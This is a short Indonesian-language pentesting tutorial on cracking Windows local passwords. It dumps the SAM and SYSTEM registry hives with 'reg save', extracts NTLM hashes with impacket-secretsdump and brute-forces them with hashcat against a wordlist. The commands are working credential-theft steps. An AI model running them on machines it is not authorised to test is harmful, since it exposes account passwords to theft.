# Pre Pentesting
1. Siapkan worldlist / kumpulan dari password, dapat dilakukan secara manual atau menggunakan tools yang sudah ada

# Pentesting Windows Password using hashcat brute force
1. Pada windows buka menu powershell dengan Run As Administrator, kemudian ketikkan perintah berikut
```
reg save HKLM\sam ./sam.save
```
```
reg save HKLM\system ./system.save
```
kemudian cari file tersebut disimpan dalam direktori sesuai dengan pemanggilan power shell
Simpan file tersebut dalam flashdisk

2. Buka kali linux, kemudian jalankan perintah berikut untuk mencari hash dari password yang didapat
```
impacket-secretsdump -sam sam.save -system system.save LOCAL
```
Perhatikan username yang akan dilakukan pentesting, catat hash terakhir setelah tanda (:)

3. Lakukan Brute Force dengan hashcat menggunakan wordlist yang telah dibuat
```
hashcat -m 1000 windows.txt hack.txt
```
* -m 1000 merupakah tipe hash yang akan di lakukan pentesting
* windows.txt merupakah file hash dari windows
* hack.txt merupakah wordlist yang telah dibuat
